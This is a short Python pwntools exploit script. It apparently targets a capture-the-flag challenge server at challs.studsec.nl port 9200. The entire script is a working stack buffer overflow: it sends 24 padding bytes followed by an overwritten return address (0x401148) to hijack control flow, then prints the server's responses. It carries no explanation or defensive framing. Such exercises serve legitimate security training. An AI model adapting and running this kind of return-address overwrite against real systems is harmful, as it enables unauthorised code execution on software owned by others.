#!/usr/bin/env python3

from pwn import *

con = remote('challs.studsec.nl', 9200)

ret_addr = 0x401148.to_bytes(8, "little")

inp = (b'\x00' * 24) + ret_addr

print(inp)

print(con.recvline())
con.sendline(inp)

while True:
    print(con.recvline())
